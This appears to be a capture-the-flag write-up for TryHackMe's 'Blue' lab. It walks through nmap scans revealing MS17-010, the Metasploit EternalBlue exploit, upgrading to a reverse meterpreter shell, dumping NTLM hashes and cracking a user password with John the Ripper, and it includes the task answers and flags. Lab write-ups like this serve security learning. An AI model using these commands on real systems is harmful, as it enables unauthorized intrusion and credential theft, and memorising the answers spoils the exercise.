@@ -1,0 +1,312 @@
+Machine Blue 10.10.148.167
+
+root@natzsec:~/Desktop/tryhackme/oscp/blue# nmap -p- -sC -sV -oA nmap/all 10.10.148.167
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 10:20 IST
+Nmap scan report for 10.10.148.167
+Host is up (0.23s latency).
+Not shown: 65526 closed ports
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49160/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:30:e2:41:88:e0 (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-05-03T00:11:05-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-05-03T05:11:05
+|_  start_date: 2020-05-03T04:49:26
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1289.06 seconds
+root@natzsec:~/Desktop/tryhackme/oscp/blue# 
+
+
+TASK 1
+
+#1 Scan Done
+
+#2	How many ports are open with a port number under 1000?
+
+3 ports => 135, 139, 445
+
+#3	What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
+
+root@natzsec:~/Desktop/tryhackme/oscp/blue# nmap --script smb-vuln* -p 139,445 10.10.148.167
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 10:47 IST
+Nmap scan report for 10.10.148.167
+Host is up (0.51s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Nmap done: 1 IP address (1 host up) scanned in 9.06 seconds
+root@natzsec:~/Desktop/tryhackme/oscp/blue# 
+
+Vulnerable to ms17-010
+
+TASK 2
+
+#1	 Start Metasploit
+
+Yes
+
+
+#2	Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
+
+exploit/windows/smb/ms17_010_eternalblue
+
+
+TASK 3
+
+#1	If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
+
+post/multi/manage/shell_to_meterpreter
+
+#2	Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)
+
+SESSIONS
+
+msf5 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) > show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(multi/manage/shell_to_meterpreter) > set LHOST 10.11.5.22
+LHOST => 10.11.5.22
+msf5 post(multi/manage/shell_to_meterpreter) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                           Connection
+  --  ----  ----               -----------                           ----------
+  1         shell x64/windows  Microsoft Windows [Version 6.1.7601]  10.11.5.22:9999 -> 10.10.113.28:49169 (10.10.113.28)
+
+msf5 post(multi/manage/shell_to_meterpreter) > set session 1
+session => 1
+msf5 post(multi/manage/shell_to_meterpreter) > exploit
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.11.5.22:4433 
+[*] Post module execution completed
+msf5 post(multi/manage/shell_to_meterpreter) > 
+[*] Sending stage (180291 bytes) to 10.10.113.28
+[*] Meterpreter session 2 opened (10.11.5.22:4433 -> 10.10.113.28:49174) at 2020-05-03 11:30:17 +0530
+[*] Stopping exploit/multi/handler
+
+msf5 post(multi/manage/shell_to_meterpreter) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                           Connection
+  --  ----  ----                     -----------                           ----------
+  1         shell x64/windows        Microsoft Windows [Version 6.1.7601]  10.11.5.22:9999 -> 10.10.113.28:49169 (10.10.113.28)
+  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC          10.11.5.22:4433 -> 10.10.113.28:49174 (10.10.113.28)
+
+msf5 post(multi/manage/shell_to_meterpreter) > session -i 2
+[-] Unknown command: session.
+msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter >
+
+Rest of the subtask are just information so not adding it.
+
+#6	Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+#7	List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column)
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
+ 456   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
+ 460   588   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\taskeng.exe
+ 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+ 588   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
+ 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
+ 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+ 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+ 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
+ 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
+ 776   1860  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
+ 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
+ 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 1020  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
+ 1052  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 1160  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 1292  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1328  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 1388  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1464  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
+ 1496  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 1532  1292  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
+ 1604  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1856  2316  mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
+ 1860  1852  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 1904  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 1940  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
+ 1996  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
+ 2060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
+ 2068  816   WmiPrvSE.exe                                                       
+ 2316  692   mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
+ 2336  692   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2488  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
+ 2504  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
+ 2552  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           
+ 2728  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           
+ 3040  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           
+
+#8	Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 
+
+meterpreter > migrate 2336
+[*] Migrating from 776 to 2336...
+[*] Migration completed successfully.
+meterpreter > 
+
+TASK 4
+
+#1	Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter >
+
+jon
+
+#2	Copy this password hash to a file and research how to crack it. What is the cracked password?
+
+root@natzsec:~/Desktop/tryhackme/oscp/blue# echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" >> jon.hash
+
+root@natzsec:~/Desktop/tryhackme/oscp/blue# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alqfna22         (Jon)
+1g 0:00:00:00 DONE (2020-05-03 11:56) 2.040g/s 20817Kp/s 20817Kc/s 20817KC/s alr19882006..alpusidi
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed
+root@natzsec:~/Desktop/tryhackme/oscp/blue#
+
+alqfna22
+
+
+Since Searching the file in a drive is pretty hard so I used the below command to search for the wildcard string
+
+C:\>dir /s *flag*
+dir /s *flag*
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+03/17/2019  02:27 PM                24 flag1.txt
+               1 File(s)             24 bytes
+
+ Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent
+
+03/17/2019  02:26 PM               482 flag1.lnk
+03/17/2019  02:30 PM               848 flag2.lnk
+03/17/2019  02:32 PM             2,344 flag3.lnk
+               3 File(s)          3,674 bytes
+
+ Directory of C:\Users\Jon\Documents
+
+03/17/2019  02:26 PM                37 flag3.txt
+               1 File(s)             37 bytes
+
+ Directory of C:\Windows\System32\config
+
+03/17/2019  02:32 PM                34 flag2.txt
+               1 File(s)             34 bytes
+
+     Total Files Listed:
+               6 File(s)          3,769 bytes
+               0 Dir(s)  20,490,186,752 bytes free
+
+C:\>cd C:\Windows\System32\config
+cd C:\Windows\System32\config
+
+C:\Windows\System32\config>type flag2.txt
+type flag2.txt
+flag{sam_database_elevated_access}
+C:\Windows\System32\config>cd C:\Users\Jon\Documents
+cd C:\Users\Jon\Documents
+
+C:\Users\Jon\Documents>type flag3.txt
+type flag3.txt
+flag{admin_documents_can_be_valuable}
+C:\Users\Jon\Documents>
+
+TASK 5
+
+FLAG 1 : flag{access_the_machine}
+
+FLAG 2 : flag{sam_database_elevated_access}
+
+FLAG 3 : flag{admin_documents_can_be_valuable}
